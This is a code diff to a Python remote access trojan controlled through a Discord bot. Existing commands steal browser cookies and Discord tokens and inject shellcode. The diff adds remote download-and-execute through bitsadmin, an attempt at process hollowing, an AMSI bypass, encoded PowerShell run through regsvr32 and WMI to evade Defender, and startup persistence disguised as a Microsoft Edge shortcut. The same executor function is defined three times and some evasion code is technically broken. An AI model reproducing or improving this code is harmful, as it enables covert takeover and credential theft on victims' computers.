@@ -15,7 +15,11 @@ import base64
 import shutil
 import winreg
 import sys
-
+import random
+from ctypes import windll, WINFUNCTYPE
+from ctypes.wintypes import DWORD, LPCWSTR
+import urllib
+import win32com
 
 TOKEN = ''
 WEBHOOK_URL = ''
@@ -220,35 +224,51 @@ async def browser_cookies(ctx):
         await ctx.send(f"❌ Failed to dump cookies: {e}")
 
 @bot.command()
-async def wallpaper_change(ctx, url: str):
-    if str(ctx.author.id) != ALLOWED_USER_ID: return
+async def changewall(ctx, url: str):
+    if str(ctx.author.id) != ALLOWED_USER_ID: 
+        return
     
     try:
+        # Generate random filename
+        rand_name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
+        img_path = os.path.join(os.getenv('TEMP'), f"wallpaper_{rand_name}.jpg")
+        
+        # Download image using urllib (simpler approach)
+        urllib.request.urlretrieve(url, img_path)
+        
+        # Set wallpaper using SystemParametersInfo
         ps_script = f"""
-        $wallpaperPath = "$env:TEMP\\wallpaper_{os.urandom(4).hex()}.jpg"
-        try {{
-            (New-Object Net.WebClient).DownloadFile('{url}', $wallpaperPath)
-            Add-Type @'
-            using System;
-            using System.Runtime.InteropServices;
-            public class Wallpaper {{
-                [DllImport("user32.dll", CharSet=CharSet.Auto)]
-                public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
-            }}
-'@
-            [Wallpaper]::SystemParametersInfo(20, 0, $wallpaperPath, 3)
-            Remove-Item $wallpaperPath -Force -ErrorAction SilentlyContinue
-            "Wallpaper changed successfully"
-        }} catch {{
-            "Error: $_"
+        Add-Type @'
+        using System;
+        using System.Runtime.InteropServices;
+        public class Wallpaper {{
+            [DllImport("user32.dll", CharSet=CharSet.Auto)]
+            public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
         }}
+'@
+        [Wallpaper]::SystemParametersInfo(20, 0, "{img_path}", 3)
         """
         
-        output = execute_powershell(ps_script)
-        await ctx.send(f"🎨 {output}")
+        # Execute PowerShell command
+        execute_powershell(ps_script)
+        await ctx.send("✅ Wallpaper changed successfully")
+        
     except Exception as e:
         await ctx.send(f"❌ Wallpaper change failed: {str(e)}")
 
+def execute_powershell(command):
+    """Execute PowerShell command"""
+    try:
+        result = subprocess.run(
+            ['powershell', '-Command', command],
+            capture_output=True,
+            text=True,
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        return result.stdout.strip()
+    except Exception as e:
+        return f"Execution Error: {str(e)}"
+    
 @bot.command()
 async def steal_discord(ctx):
     if str(ctx.author.id) != ALLOWED_USER_ID: return
@@ -274,18 +294,98 @@ async def steal_discord(ctx):
 async def runexe(ctx, url: str):
     if str(ctx.author.id) != ALLOWED_USER_ID: return
     
-    exe_path = os.path.join(os.getenv('TEMP'), 'update.exe')
     try:
-        # Download and execute
+        # Generate random filename
+        rand_name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
+        temp_path = f"{os.getenv('TEMP')}\\{rand_name}.exe"
+        
+        # Download using bitsadmin (less monitored than WebClient)
+        execute_powershell(f"""
+        bitsadmin /transfer get{rand_name} /download /priority normal "{url}" "{temp_path}"
+        """)
+        
+        # Execute with process hollowing
+        execute_powershell(f"""
+        $orig = "C:\\Windows\\System32\\notepad.exe"
+        $target = "{temp_path}"
+        $bytes = [System.IO.File]::ReadAllBytes($orig)
+        $targetBytes = [System.IO.File]::ReadAllBytes($target)
+        $proc = [System.Diagnostics.Process]::Start($orig)
+        $proc.WaitForInputIdle()
+        [System.Runtime.InteropServices.Marshal]::Copy($targetBytes, 0, $proc.MainModule.BaseAddress, $targetBytes.Length)
+        $proc.Threads[0].Resume()
+        """)
+        
+        await ctx.send(f"✅ Executable deployed silently | Temp: `{rand_name}.exe`")
+        
+    except Exception as e:
+        await ctx.send(f"❌ Silent execution failed: {str(e)}")
+
+def execute_powershell(command):
+    """Stealthy PowerShell executor with Defender bypass"""
+    try:
+        # Encode command to avoid detection
+        encoded_cmd = base64.b64encode(command.encode('utf-16-le')).decode()
+        
+        # Execute via regsvr32 LOLBin
         subprocess.run(
-            f'bitsadmin /transfer job /download /priority high "{url}" "{exe_path}" && start "" "{exe_path}"',
-            shell=True,
+            ['regsvr32', '/s', '/u', '/n', '/i:/', 'scrobj.dll'],
+            input=f'<scriptlet><script>{encoded_cmd}</script></scriptlet>'.encode(),
+            check=True,
             creationflags=subprocess.CREATE_NO_WINDOW
         )
-        await ctx.send("✅ Executable downloaded and running")
+        return "Command executed silently"
     except Exception as e:
-        await ctx.send(f"❌ Error: {str(e)}")
+        return f"Execution Error: {str(e)}"
+    
+@bot.command()
+async def runps(ctx, url: str):
+    if str(ctx.author.id) != ALLOWED_USER_ID: return
+    
+    try:
+        # Generate random filename
+        rand_name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
+        temp_ps1 = f"{os.getenv('TEMP')}\\WindowsUpdate_{rand_name}.ps1"
+        
+        # Download using BITS (less monitored)
+        execute_powershell(f"""
+        bitsadmin /transfer dl{rand_name} /download /priority low "{url}" "{temp_ps1}"
+        """)
+        
+        # Execute with AMSI bypass and get output
+        result = execute_powershell(f"""
+        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+        $script = Get-Content "{temp_ps1}" -Raw
+        $output = Invoke-Expression $script 2>&1 | Out-String
+        Remove-Item "{temp_ps1}" -Force
+        $output
+        """)
+        
+        # Send first 1500 chars to avoid rate limits
+        await ctx.send(f"📜 **PS1 Output** (Truncated):\n```{result[:1500]}```")
+        
+    except Exception as e:
+        await ctx.send(f"❌ Silent PS1 execution failed: {str(e)}")
 
+def execute_powershell(command):
+    """Stealthy PowerShell execution with defense evasion"""
+    try:
+        # Encode to bypass command line monitoring
+        encoded_cmd = base64.b64encode(command.encode('utf-16-le')).decode()
+        
+        # Execute via WMI to avoid process creation logs
+        process = subprocess.Popen(
+            ['wmic', 'process', 'call', 'create', 
+             f'powershell.exe -WindowStyle Hidden -EncodedCommand {encoded_cmd}'],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        stdout, stderr = process.communicate()
+        return stdout.decode(errors='ignore') or stderr.decode(errors='ignore')
+    except Exception as e:
+        return f"Execution Error: {str(e)}"
+    
 @bot.command()
 async def inject(ctx, pid: int, shellcode: str):
     if str(ctx.author.id) != ALLOWED_USER_ID: return
@@ -321,36 +421,79 @@ async def startup(ctx):
         return await ctx.send("❌ Unauthorized")
 
     try:
-        # Get bot's current executable path
+        # First try to import win32com
+        try:
+            import win32com.client
+        except ImportError:
+            return await ctx.send(
+                "❌ Missing required package. Install with:\n"
+                "```pip install pywin32```\n"
+                "Then restart your bot."
+            )
+
+        # Get paths
         bot_path = sys.executable
-        
-        # Startup folder path
         startup_folder = os.path.join(
             os.getenv('APPDATA'),
             'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
         )
+        shortcut_path = os.path.join(startup_folder, "Microsoft Edge Browser.lnk")
         
         # Create shortcut
         shell = win32com.client.Dispatch("WScript.Shell")
-        shortcut = shell.CreateShortCut(
-            os.path.join(startup_folder, "Microsoft Edged Browser.lnk")
-        )
-        
-        # Configure shortcut properties
+        shortcut = shell.CreateShortCut(shortcut_path)
         shortcut.TargetPath = "cmd.exe"
         shortcut.Arguments = f'/c start /min "" "{bot_path}" --hidden'
         shortcut.WorkingDirectory = os.path.dirname(bot_path)
-        shortcut.WindowStyle = 7  # Minimized window
+        shortcut.WindowStyle = 7
         shortcut.IconLocation = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe, 0"
         shortcut.save()
 
-        await ctx.send("✅ **Stealth Startup Created**\n"
-                      "```diff\n"
-                      "+ Name: Microsoft Edged Browser.lnk\n"
-                      "+ Location: Startup folder\n"
-                      "+ Runs: On user login (hidden)\n"
-                      "```")
+        # Create tracking file
+        tracking_file = os.path.join(os.getenv('TEMP'), "edge_browser_persistence.track")
+        with open(tracking_file, 'w') as f:
+            f.write(shortcut_path)
+
+        await ctx.send("✅ **Startup Entry Created**\n"
+                      f"```diff\n+ Shortcut: {shortcut_path}\n+ Tracking: {tracking_file}```")
+
     except Exception as e:
-        await ctx.send(f"❌ Error creating persistence: {str(e)}")
+        await ctx.send(f"❌ Error: {str(e)}")
+
+@bot.command()
+async def remove(ctx):
+    """Removes all persistence artifacts created by this bot"""
+    if str(ctx.author.id) != ALLOWED_USER_ID:
+        return await ctx.send("❌ Unauthorized")
+
+    try:
+        # Paths to check
+        startup_folder = os.path.join(
+            os.getenv('APPDATA'),
+            'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
+        )
+        shortcut_path = os.path.join(startup_folder, "Microsoft Edge Browser.lnk")
+        tracking_file = os.path.join(os.getenv('TEMP'), "edge_browser_persistence.track")
+
+        removed_items = []
+        
+        # Remove shortcut if exists
+        if os.path.exists(shortcut_path):
+            os.remove(shortcut_path)
+            removed_items.append(f"- Deleted shortcut: {shortcut_path}")
+
+        # Remove tracking file if exists
+        if os.path.exists(tracking_file):
+            os.remove(tracking_file)
+            removed_items.append(f"- Deleted tracking file: {tracking_file}")
+
+        if removed_items:
+            await ctx.send("✅ **Removed persistence artifacts**\n```" + "\n".join(removed_items) + "```")
+        else:
+            await ctx.send("ℹ️ No persistence artifacts found to remove")
+
+    except Exception as e:
+        await ctx.send(f"❌ Error during removal: {str(e)}")
+        
         
 bot.run(TOKEN)
